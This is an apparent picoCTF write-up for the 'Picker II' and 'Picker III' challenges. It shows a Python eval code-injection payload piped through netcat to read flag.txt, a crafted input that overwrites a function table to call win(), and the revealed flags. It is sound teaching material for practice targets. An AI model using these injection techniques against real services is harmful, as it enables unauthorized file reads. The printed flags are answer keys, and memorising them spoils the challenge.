---
title: "Interlude"
weight: 7
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
# bookHref: ''
---
# PicoCTF: Low Level Binary Intro - Interlude

We’re going to take a break from low level code and consider some Python programs again. We’ll try to draw some parallels between exploiting binary programs and exploiting Python programs.

## Picker II 

> Can you figure out how this program works to get the flag?

This time, we are analyzing python code, not in a low-level language, but just analyzing high level code.

The problem offer to us a python script file and a connection through netcat (to run the code remotely, where the flag is located). The script have the following functions:

```python
def getRandomNumber():
def exit():
def esoteric1():
def win():
def esoteric2():
def filter(user_input):
```

Running this script, we are presenting with an input to be inserted. If we input the text "getRandomNumber", the program return with "4". This means that we can call any function in the code with this input. The function we want to run is called "win()":

```python
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```

This function opens a file named "flag.txt", read it, and print on screen. This is what we need, but there's a problem. Before we reach the "win" function, the input pass through a filter method, that returns false if we try to insert "win" into the program input. So we need to find an alternative.

```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```

Looking through the Filter, we can see that it uses a vulnerable function called "eval":

```python
if( filter(user_input) ):
	eval(user_input + '()')
```

We can use that to our advantage, maybe we can't use the call to "win", but we can call everything useful inside the function "win". Let's inject a code to read the file "flag.txt" into the program:

```python
echo "print(open('flag.txt', 'r').read())" | nc saturn.picoctf.net 69420
```

And success, with that, the flag is revealed.


{{% details title="Answer: Flag Picker II" open=false %}}
```
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
```
{{% /details %}}

---

## Picker III 

> Can you figure out how this program works to get the flag?

This is very similar to the previous one. We are going to analyze a python script and find vulnerabilities in it. After finding a vulnerability, we can apply to the netcat address and retrieve the flag.

The program asks now to select a method from a range of numbers, from 1 to 4, limiting our input. The table is written in a variable named `func_table`:

```python
  global func_table

  # This table is formatted for easier viewing, but it is really one line
  func_table = \
'''\
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
'''
```

This is the list of functions possible to be called. This variable is being checked if is modified by it's size. If the table is changed in size, the program throws a message saying that it's currupted:

```python
FUNC_TABLE_SIZE = 4
FUNC_TABLE_ENTRY_SIZE = 32
CORRUPT_MESSAGE = 'Table corrupted. Try entering \'reset\' to fix it'

def check_table():
  global func_table

  if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE):
    return False

  return True
```

If the table is not 32 chars by 4 lines (32x4 characters), it is defined as "Corrupted". If we check the current table, we can see that this numbers match, filled with spaces:

```python
		32 Characters
|-------------------------------|
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
```

We can also Read and Write a variable (such as `func_table` and `FUNC_TABLE_SIZE`). The `getRandomNumber` is the same as always.

After reading and analyzing the code, we can experiment with the `func_table` and the write_variable function. The idea is to change the function "print_table" to "win" in the table without change the table size. Inputting something like:

```python
		32 Characters
|-------------------------------|
win                             \  <-- change
read_variable                   \
write_variable                  \
getRandomNumber                 \
```

And then call the first function of the table, showing us the flag.

This time, I'll be automating the input using a file.txt with the input that I desire to send at once. The file.txt will be something like:

```
3
func_table
'''win                             read_variable                   write_variable                  getRandomNumber                 '''
1
```

The text will do:
- 3 : Select to change a variable (write_variable)
- func_table : name of the variable
- '''win  ... : new value of the table
- 1 : Select to call the first variable (before print_table, now win)

And the shell command is:

```bash
cat file.txt | nc saturn.picoctf.net 69420
```

After the automated input ran into the netcat connection, we receive the following output, from the function "win()":

```
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x63 0x32 0x30 0x66 0x35 0x32 0x32 0x32 0x7d
```

After decoding this message, converting from hexadecimal to string, we have our flag:

{{% details title="Answer: Flag Picker III" open=false %}}
```
picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_c20f5222}
```
{{% /details %}}

